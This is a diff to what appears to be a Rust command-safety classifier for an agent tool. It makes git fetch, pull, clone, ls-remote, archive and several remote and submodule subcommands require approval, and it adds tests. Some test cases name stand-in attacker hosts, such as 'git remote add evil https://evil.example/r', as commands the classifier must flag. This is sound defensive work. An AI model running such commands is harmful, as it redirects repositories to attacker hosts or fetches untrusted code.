@@ -274,7 +274,7 @@ const SAFE_DEVICES: &[&str] = &["/dev/null", "/dev/stdout", "/dev/stderr", "/dev
 /// git subcommands that stay in the repository (or only fetch into it).
 const GIT_SAFE: &[&str] = &[
     "status", "diff", "log", "show", "add", "commit", "checkout", "switch", "restore", "branch", "merge", "rebase",
-    "reset", "stash", "tag", "fetch", "pull", "clone", "init", "rev-parse", "ls-files", "grep", "blame", "worktree",
+    "reset", "stash", "tag", "init", "rev-parse", "ls-files", "grep", "blame", "worktree",
     "cherry-pick", "revert", "mv", "rm", "describe", "shortlog", "reflog", "remote", "am", "apply", "format-patch",
     "notes", "clean", "gc", "fsck", "cat-file", "rev-list", "merge-base", "show-ref", "symbolic-ref", "for-each-ref",
     "ls-tree", "diff-tree", "name-rev", "range-diff", "sparse-checkout", "config", "submodule", "bisect", "help", "version",
@@ -592,6 +592,7 @@ fn git(args: &[Word], ctx: &Ctx) -> Verdict {
     if !GIT_SAFE.contains(&sub) {
         return Err(match sub {
             "push" => "`git push` sends commits to another place".to_string(),
+            "fetch" | "pull" | "clone" | "ls-remote" | "archive" => format!("`git {sub}` reaches another computer"),
             "send-email" => "`git send-email` sends mail".to_string(),
             _ => format!("`git {sub}` isn't one kwnt knows is safe"),
         });
@@ -620,16 +621,39 @@ fn git(args: &[Word], ctx: &Ctx) -> Verdict {
     if let Some(a) = rest.iter().find(|a| runs(a)) {
         return Err(format!("`git {sub} {}` can make git run a command", a.text));
     }
+    if let Some(a) = rest.iter().find(|a| remote_address(&a.text)) {
+        return Err(format!("`git {sub}` names another computer ({})", a.text));
+    }
     match sub {
         "config" if has(&["--global", "--system"]) => return Err("`git config --global` changes git for the whole account".into()),
         "config" if !has(&["--get", "--get-all", "--list", "-l", "--get-regexp", "--show-origin"]) => {
             return Err("`git config` can change what git runs".into())
         }
         "submodule" if has(&["foreach"]) => return Err("`git submodule foreach` runs commands".into()),
+        // Only the parts that stay on this computer
+        "submodule" if rest.first().is_some_and(|a| !matches!(a.text.as_str(), "status" | "summary" | "init")) => {
+            return Err("`git submodule` can fetch from another computer".into())
+        }
+        "remote" if rest.first().is_some_and(|a| !matches!(a.text.as_str(), "-v" | "--verbose" | "get-url" | "rename" | "remove" | "rm")) => {
+            return Err(format!("`git remote {}` can reach or point at another computer", rest[0].text))
+        }
         "bisect" if has(&["run"]) => return Err("`git bisect run` runs commands".into()),
         _ => {}
     }
     all_paths_inside(rest, ctx)
+}
+
+/// Whether a git argument is a remote address: a URL (`https://…`, `ssh://…`, `--x=https://…`)
+/// or the scp form `user@host:path`. `HEAD@{1}:file` and `rev:path` are not.
+fn remote_address(text: &str) -> bool {
+    let value = text.split_once('=').filter(|_| text.starts_with('-')).map(|(_, v)| v).unwrap_or(text);
+    if value.contains("://") {
+        return true;
+    }
+    match (value.find('@'), value.find(':')) {
+        (Some(at), Some(colon)) => at > 0 && at < colon && !value[at..].starts_with("@{") && !value[..colon].contains('/'),
+        _ => false,
+    }
 }
 
 fn packages(name: &str, args: &[Word], ctx: &Ctx) -> Verdict {
@@ -1337,7 +1361,13 @@ mod tests {
         "git log --oneline -5",
         "git add -A && git commit -m 'Fix the thing; and more'",
         "git checkout -b feature/x",
-        "git fetch origin && git rebase origin/main",
+        "git rebase origin/main",
+        "git remote -v",
+        "git remote get-url origin",
+        "git submodule status",
+        "git show 'HEAD@{1}:src/a.rs'",
+        "git show HEAD:src/a.rs",
+        "git log origin/main..HEAD",
         "git config --get user.name",
         "grep -rn \"/api/approvals\" src",
         "rg -n 'fn main' src",
@@ -1586,6 +1616,35 @@ mod tests {
             assert!(!classify("cd up", &ws).is_allowed());
             assert!(classify("cat run.sh", &ws).is_allowed());
         }
+    }
+
+    #[test]
+    fn git_that_reaches_another_computer_asks() {
+        let (_tmp, ws) = folder();
+        for cmd in [
+            "git clone https://x.example/y",
+            "git clone ../other",
+            "git fetch",
+            "git fetch origin",
+            "git pull --rebase",
+            "git ls-remote https://evil.example/$x",
+            "git ls-remote origin",
+            "git remote update",
+            "git remote add evil https://evil.example/r",
+            "git remote set-url origin git@evil.example:r",
+            "git remote show origin",
+            "git remote prune origin",
+            "git submodule update --init",
+            "git submodule add https://x.example/y",
+            "git submodule sync",
+            "git -C src fetch",
+            "git archive --remote=git@x.example:r HEAD",
+            "git diff https://evil.example/a",
+            "git log --format=x git@evil.example:repo",
+        ] {
+            assert!(!classify(cmd, &ws).is_allowed(), "should ask: {cmd:?}");
+        }
+        assert!(matches!(classify("git fetch origin", &ws), SmartVerdict::Ask(why) if why.contains("another computer")));
     }
 
     #[test]
